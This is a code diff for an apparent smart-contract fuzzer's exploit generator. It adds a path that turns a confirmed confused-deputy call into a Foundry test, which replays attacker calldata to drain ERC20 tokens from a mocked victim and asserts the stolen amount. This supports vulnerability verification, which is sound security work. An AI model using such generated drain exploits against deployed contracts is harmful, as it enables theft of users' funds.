@@ -1,8 +1,18 @@
-//! 机械合成：解析 witness calldata 的臂 3 router 头形 → 替换槽 →
-//! 渲染 Foundry 工程文件。不逐字节手写 calldata：测试体的调用
-//! 序列完全由 `abi.encodeWithSelector` / `abi.encodeCall` 在
-//! Solidity 侧表达，参数（BALANCE / 地址 / 字节码 / registry 槽）
-//! 由本模块从 poc.json 注入。
+//! 机械合成（两条族路径，均零个案逻辑）：
+//!
+//! - arbitrary_call 族：解析 witness calldata 的臂 3 router 头形 →
+//!   替换槽 → 渲染 Foundry 工程文件；头形外（fork 态）= verbatim
+//!   replay 模板。
+//! - approval_drain 族（deputy_call / drain_forward，#20）：定罪呼出
+//!   （poc.call）input 形状匹配 ERC20 transfer/transferFrom → 通用
+//!   drain 模板（victim 资产 = 呼出目标 etch MockERC20 + keccak 槽
+//!   前提布置 + verbatim 重放 + 缴获断言）；不匹配如实报
+//!   [`PocgenError::NoGenericAction`]。
+//!
+//! 不逐字节手写 calldata：测试体的调用序列完全由
+//! `abi.encodeWithSelector` / `abi.encodeCall` 在 Solidity 侧表达，
+//! 参数（BALANCE / 地址 / 字节码 / registry 槽）由本模块从 poc.json
+//! 注入。
 
 use std::fmt::Write as _;
 use std::path::Path;
@@ -67,6 +77,9 @@ pub enum PocgenError {
     ForgeFailed { output: String },
     /// IO 落盘错误。
     Io(std::io::Error),
+    /// approval_drain 族 L2 诚实降级：定罪呼出的 input 形状不匹配
+    /// ERC20 transfer/transferFrom ABI——无通用有害动作，不硬套个案。
+    NoGenericAction(String),
 }
 
 impl std::fmt::Display for PocgenError {
@@ -86,25 +99,93 @@ impl std::fmt::Display for PocgenError {
                 write!(f, "forge test 红灯（fail-closed）:\n{output}")
             }
             PocgenError::Io(e) => write!(f, "IO 错误: {e}"),
+            PocgenError::NoGenericAction(s) => {
+                write!(f, "无通用有害动作（L2 诚实降级，不硬套个案）: {s}")
+            }
         }
     }
 }
 
 impl std::error::Error for PocgenError {}
 
-/// 有害动作集合（M0 只实现 ERC20 drain 臂；按族扩展的挂点）。
+/// 有害动作集合（M0 = ERC20 drain 臂；approval_drain 族按定罪呼出
+/// 的 input 形状机械选择）。
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum HarmfulAction {
     /// 对 ERC20 目标抽干路由器持仓：transferFrom(router, attacker,
     /// balance)，前提 allowance[router][router] ≥ balance（setUp
-    /// vm.store 机械布置）。
+    /// vm.store 机械布置）。arbitrary_call 臂 3 router 模板用。
     Erc20Drain,
+    /// approval_drain 通用臂：witness 定罪呼出本身就是
+    /// transferFrom(from, to, amount)——victim = from，缴获 = to，
+    /// 前提 allowance[from][ROUTER] ≥ amount（机械布置）。
+    Erc20TransferFrom {
+        from: [u8; 20],
+        to: [u8; 20],
+        amount: U256,
+    },
+    /// 同：transfer(to, amount)——victim = 路由器自身持仓
+    /// （呼出 msg.sender = ROUTER），无 allowance 前提。
+    Erc20Transfer { to: [u8; 20], amount: U256 },
 }
 
-/// 有害动作选择（机械）：M0 臂 3 primitive 对 ERC20 目标的唯一
-/// 有害动作 = 抽干。未来按族/目标类型在此分发。
-pub fn select_action() -> HarmfulAction {
-    HarmfulAction::Erc20Drain
+/// ERC20 选择子（keccak 现算，不硬编码魔数——校验见单测）。
+fn erc20_selectors() -> (u32, u32) {
+    use sha3::{Digest, Keccak256};
+    let sel = |sig: &str| {
+        let mut h = Keccak256::new();
+        h.update(sig.as_bytes());
+        u32::from_be_bytes(h.finalize()[..4].try_into().expect("keccak 输出 ≥ 4B"))
+    };
+    (
+        sel("transferFrom(address,address,uint256)"),
+        sel("transfer(address,uint256)"),
+    )
+}
+
+/// L2 通用有害动作选择（机械）：poc 记录的定罪呼出（poc.call）input
+/// 形状匹配 ERC20 transferFrom（3 槽）/ transfer（2 槽）即合成
+/// 对应动作；否则 [`PocgenError::NoGenericAction`] 如实降级。
+///
+/// 形状判定只认 selector（keccak 现算）+ 头槽数；槽语义（address
+/// 低 160 位 + uint256）按 ERC20 ABI 标准形解——字节码层不可分
+/// 的更宽形状（如代理透传变体）如实留给 future。
+pub fn select_action(poc: &Poc) -> Result<HarmfulAction, PocgenError> {
+    let call = poc.call.as_ref().ok_or_else(|| {
+        PocgenError::NoGenericAction("poc 无定罪呼出记录（#20 前旧 poc）".to_string())
+    })?;
+    let input = hex_bytes(&call.input).map_err(PocgenError::BadPoc)?;
+    if input.len() < 4 {
+        return Err(PocgenError::NoGenericAction(format!(
+            "定罪呼出 input 不足 4 字节 selector（{} 字节）",
+            input.len()
+        )));
+    }
+    let selector = u32::from_be_bytes(input[..4].try_into().expect("len≥4"));
+    let rest = &input[4..];
+    let words = rest.len() / 32;
+    let tail = rest.len() % 32 != 0;
+    let addr_at = |idx: usize| {
+        let mut a = [0u8; 20];
+        a.copy_from_slice(&rest[idx * 32 + 12..idx * 32 + 32]);
+        a
+    };
+    let amount_at = |idx: usize| word(rest, idx);
+    let (transfer_from, transfer) = erc20_selectors();
+    match (selector, words, tail) {
+        (s, 3, false) if s == transfer_from => Ok(HarmfulAction::Erc20TransferFrom {
+            from: addr_at(0),
+            to: addr_at(1),
+            amount: amount_at(2),
+        }),
+        (s, 2, false) if s == transfer => Ok(HarmfulAction::Erc20Transfer {
+            to: addr_at(0),
+            amount: amount_at(1),
+        }),
+        _ => Err(PocgenError::NoGenericAction(format!(
+            "定罪呼出 input 非 ERC20 transfer/transferFrom 标准形（selector={selector:#010x}，头槽数={words}）"
+        ))),
+    }
 }
 
 /// 臂 3 router 头形：witness calldata = selector + head（槽 0 = 目标
@@ -218,28 +299,63 @@ pub fn generate_exploit_with(
         }
         None => ROUTER_ADDRESS,
     };
-    let shape = parse_head_shape(&calldata);
-    let artifacts = match shape {
-        Ok(shape) => ProjectArtifacts::render(
-            &shape,
-            &prestate,
-            code,
-            params,
-            fork_mode,
-            &poc.deployments,
-            contract,
-        ),
-        // 臂 3 router 头形解析不了但处于 fork 态：通用 replay 模板
-        // （verbatim witness calldata + 部署 etch + 空 revert 断言）。
-        Err(_) if fork_mode => ProjectArtifacts::render_replay(
-            &prestate,
-            code,
-            &calldata,
-            caller_arr,
-            &poc.deployments,
-            contract,
-        ),
-        Err(e) => return Err(e),
+    // 族分发（#20）：approval_drain 族走通用 ERC20 形状动作选择
+    //（形状不匹配即 NoGenericAction 诚实降级）；arbitrary_call 族保持
+    // 既有路径（臂 3 router 头形 → 旧模板；fork 态头形外 → replay 模板）。
+    let artifacts = match poc.family {
+        loom_fuzz_oracle::HitFamily::ArbitraryCall => {
+            let shape = parse_head_shape(&calldata);
+            match shape {
+                Ok(shape) => ProjectArtifacts::render(
+                    &shape,
+                    &prestate,
+                    code,
+                    params,
+                    fork_mode,
+                    &poc.deployments,
+                    contract,
+                ),
+                // 臂 3 router 头形解析不了但处于 fork 态：通用 replay 模板
+                //（verbatim witness calldata + 部署 etch + 空 revert 断言）。
+                Err(_) if fork_mode => ProjectArtifacts::render_replay(
+                    &prestate,
+                    code,
+                    &calldata,
+                    caller_arr,
+                    &poc.deployments,
+                    contract,
+                ),
+                Err(e) => return Err(e),
+            }
+        }
+        _ => {
+            // deputy_call / drain_forward：定罪呼出形状匹配 ERC20
+            // transfer/transferFrom → 通用 drain 工程；否则如实报
+            // "无通用动作"（fail-closed 不硬套个案）。
+            let action = select_action(poc)?;
+            let call = poc.call.as_ref().expect("select_action 已验证 presence");
+            let target = hex_bytes(&call.target).map_err(PocgenError::BadPoc)?;
+            if target.len() != 20 {
+                return Err(PocgenError::BadPoc(
+                    "poc.call.target 非 20 字节".to_string(),
+                ));
+            }
+            let mut target_arr = [0u8; 20];
+            target_arr.copy_from_slice(&target);
+            ProjectArtifacts::render_drain(
+                action,
+                &DrainCtx {
+                    victim_token: target_arr,
+                    prestate: &prestate,
+                    code_hex: code,
+                    calldata: &calldata,
+                    caller: caller_arr,
+                    deployments: &poc.deployments,
+                    contract,
+                },
+                fork_mode,
+            )
+        }
     };
     artifacts.write(out_dir).map_err(PocgenError::Io)?;
     let summary = crate::project::forge_test(out_dir, fork_mode, poc.fork.as_ref())?;
@@ -303,6 +419,26 @@ impl ProjectArtifacts {
             ("README.md".into(), readme(true)),
             ("run.sh".into(), run_sh()),
         ];
+        ProjectArtifacts { files }
+    }
+
+    /// approval_drain 族通用 drain 工程（#20，零个案逻辑）：victim
+    /// 资产 = 定罪呼出目标（etch MockERC20 runtime——机械制造受害
+    /// 代币），witness calldata verbatim 重放（vm.prank caller），
+    /// 缴获断言 balanceOf(缴获地址) == 金额。genesis / fork 同模板
+    /// （fork = --fork-url + run.sh，链上状态其余部分照 fork）。
+    fn render_drain(action: HarmfulAction, ctx: &DrainCtx<'_>, fork: bool) -> Self {
+        let mut files = vec![
+            ("src/MockERC20.sol".into(), mock_erc20_sol()),
+            ("src/IERC20.sol".into(), ierc20_sol()),
+            ("src/Vm.sol".into(), vm_sol()),
+            ("test/PoC.t.sol".into(), drain_test_sol(action, ctx)),
+            ("foundry.toml".into(), foundry_toml(fork)),
+            ("README.md".into(), readme_drain(fork)),
+        ];
+        if fork {
+            files.push(("run.sh".into(), run_sh()));
+        }
         ProjectArtifacts { files }
     }
 
@@ -561,6 +697,198 @@ contract PoC {{
 }}
 "#
     )
+}
+
+/// approval_drain 通用 drain 测试体（机械合成，零个案逻辑）：
+/// victim 资产合约 = 定罪呼出目标（MockERC20 runtime etch 到该
+/// 地址）；victim 余额 + allowance（transferFrom 形）vm.store 机械
+/// 布置（keccak 槽公式，MockERC20 槽位钉死注释见 src/MockERC20.sol）；
+/// witness calldata verbatim 重放；缴获断言 balanceOf(to) == amount。
+/// 通用 drain 模板的注入上下文（poc.json 派生，收敛参数面）。
+struct DrainCtx<'a> {
+    victim_token: [u8; 20],
+    prestate: &'a [(U256, U256)],
+    code_hex: &'a str,
+    calldata: &'a [u8],
+    caller: [u8; 20],
+    deployments: &'a [PocDeployment],
+    contract: [u8; 20],
+}
+
+fn drain_test_sol(action: HarmfulAction, ctx: &DrainCtx<'_>) -> String {
+    let code_hex = ctx.code_hex;
+    let router = addr_expr(ctx.contract);
+    let victim = addr_expr(ctx.victim_token);
+    let attacker = addr_expr(ctx.caller);
+    let mut stores = String::new();
+    for (slot, value) in ctx.prestate {
+        let _ = writeln!(
+            stores,
+            "        vm.store(ROUTER, 0x{}, bytes32(uint256(0x{})));",
+            u256_hex64(*slot),
+            u256_hex64(*value)
+        );
+    }
+    for d in ctx.deployments {
+        let _ = writeln!(
+            stores,
+            "        vm.etch({}, hex\"{}\"); // fork deployment",
+            addr_expr(deploy_addr(d)),
+            d.runtime_hex.trim_start_matches("0x")
+        );
+    }
+    // 有害动作前提：victim 余额 +（transferFrom 形）allowance。
+    let (capture_to, amount, victim_stores) = match action {
+        HarmfulAction::Erc20TransferFrom { from, to, amount } => {
+            let from_e = addr_expr(from);
+            let amount_dec = amount.to_string();
+            let mut s = String::new();
+            let _ = writeln!(
+                s,
+                "        vm.store(VICTIM_TOKEN, keccak256(abi.encode({from_e}, uint256(0))), bytes32(uint256({amount_dec})));"
+            );
+            let _ = writeln!(
+                s,
+                "        vm.store(VICTIM_TOKEN, keccak256(abi.encode(ROUTER, keccak256(abi.encode({from_e}, uint256(1))))), bytes32(uint256({amount_dec})));"
+            );
+            (addr_expr(to), amount_dec, s)
+        }
+        HarmfulAction::Erc20Transfer { to, amount } => {
+            let amount_dec = amount.to_string();
+            let mut s = String::new();
+            let _ = writeln!(
+                s,
+                "        vm.store(VICTIM_TOKEN, keccak256(abi.encode(ROUTER, uint256(0))), bytes32(uint256({amount_dec})));"
+            );
+            (addr_expr(to), amount_dec, s)
+        }
+        // 旧臂 3 动作只走 poc_test_sol 模板，不会到这。
+        HarmfulAction::Erc20Drain => unreachable!("Erc20Drain 走臂 3 router 模板"),
+    };
+    stores.push_str(&victim_stores);
+    let calldata_hex = {
+        let mut s = String::with_capacity(ctx.calldata.len() * 2);
+        for b in ctx.calldata {
+            let _ = write!(s, "{b:02x}");
+        }
+        s
+    };
+    format!(
+        r#"// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {{MockERC20}} from "../src/MockERC20.sol";
+import {{IERC20}} from "../src/IERC20.sol";
+import {{Vm}} from "../src/Vm.sol";
+
+/// L2 exploit PoC（loom-fuzz-pocgen 通用 drain 合成，勿手改——重生成覆盖）。
+///
+/// L1 primitive（approval_drain confirmed）：deputy/confused-deputy 呼出
+/// 本身即 ERC20 transfer/transferFrom（形状由 poc.json 定罪呼出的
+/// input 机械判定——不匹配时 pocgen 如实报"无通用动作"，不硬套）。
+/// L2 组装：victim 资产 = 定罪呼出目标（MockERC20 etch 制造），
+/// 前提槽（余额 + allowance）keccak 公式布置，witness calldata
+/// verbatim 重放，终点断言缴获。
+contract PoC {{
+    Vm constant vm = Vm({VM_ADDRESS});
+    address constant ROUTER = {router};
+    address constant VICTIM_TOKEN = {victim};
+    address constant ATTACKER = {attacker};
+
+    function testExploit() public {{
+        // 资产模型：victim 资产 = 定罪呼出目标，MockERC20 runtime 刻蚀。
+        MockERC20 token = new MockERC20();
+        vm.etch(VICTIM_TOKEN, address(token).code);
+
+        // 目标合约：poc.json 的运行时字节码 + prestate/部署布置。
+        vm.etch(ROUTER, hex"{code_hex}");
+{stores}
+        // witness calldata verbatim 重放（caller 与 L1 见证一致）。
+        vm.prank(ATTACKER);
+        (bool ok, bytes memory returndata) = payable(ROUTER).call(hex"{calldata_hex}");
+
+        // ① L1 primitive：整笔成功（deputy 呼出未 revert）。
+        require(ok, string.concat("L1: deputy call failed: ", _err(returndata)));
+        // ② L2 缴获：balanceOf(缴获地址) == 金额（终点断言）。
+        require(
+            IERC20(VICTIM_TOKEN).balanceOf({capture_to}) == {amount},
+            string.concat("L2: drained amount mismatch: ", _toString(IERC20(VICTIM_TOKEN).balanceOf({capture_to})))
+        );
+    }}
+
+    function _err(bytes memory returndata) internal pure returns (string memory) {{
+        if (returndata.length < 68) return "no revert reason";
+        uint256 offset;
+        for (uint256 i = 4; i < 36; i++) {{
+            offset = (offset << 8) | uint8(returndata[i]);
+        }}
+        bytes memory reason = new bytes(offset);
+        for (uint256 i = 0; i < offset && 36 + i < returndata.length; i++) {{
+            reason[i] = returndata[36 + i];
+        }}
+        return string(reason);
+    }}
+
+    function _toString(uint256 v) internal pure returns (string memory) {{
+        if (v == 0) return "0";
+        bytes memory buf = new bytes(78);
+        uint256 i = buf.length;
+        while (v > 0) {{
+            i--;
+            buf[i] = bytes1(uint8(48 + (v % 10)));
+            v /= 10;
+        }}
+        bytes memory out = new bytes(buf.length - i);
+        for (uint256 j = 0; j < out.length; j++) {{
+            out[j] = buf[i + j];
+        }}
+        return string(out);
+    }}
+}}
+"#
+    )
+}
+
+/// 通用 drain 工程 README（覆盖度声明写清：形状不匹配 =
+/// "无通用动作"，不硬套个案）。
+fn readme_drain(fork: bool) -> String {
+    let mut s = String::new();
+    s.push_str(
+        r#"# loom-fuzz exploit PoC（L2 价值影响层，approval_drain 通用 drain）
+
+机械合成自 confirmed 的 poc.json（loom-fuzz-pocgen）——**forge test
+绿灯 = 终判**。本工程由 poc.json 的定罪呼出（poc.call）形状机械合成：
+input 匹配 ERC20 transferFrom/transfer 标准 ABI 即生成 drain 测试；
+**不匹配时 pocgen 如实报"无通用动作"（NoGenericAction）**——零个案
+逻辑，不硬套。
+
+## 结构
+
+- `src/MockERC20.sol`：受害资产（槽布局钉死：balanceOf = slot 0、
+  allowance = slot 1——vm.store 机械公式的依据）。
+- `test/PoC.t.sol`：victim 资产 etch（定罪呼出目标）→ 前提槽
+  （余额 + allowance，keccak 公式）→ witness calldata verbatim 重放
+  → L1 `require(ok)` + L2 `require(balanceOf(缴获) == 金额)`。
+
+```sh
+forge test          # 字节码模式（默认，离线）
+```
+"#,
+    );
+    if fork {
+        s.push_str(
+            r#"
+## fork 模式（BlockMachine）
+
+```sh
+export BLOCKMACHINE_RPC_URL=...
+export BLOCKMACHINE_API_KEY=...    # 空 = 直接无 key 连接（免费档）
+./run.sh
+```
+"#,
+        );
+    }
+    s
 }
 
 fn foundry_toml(fork: bool) -> String {
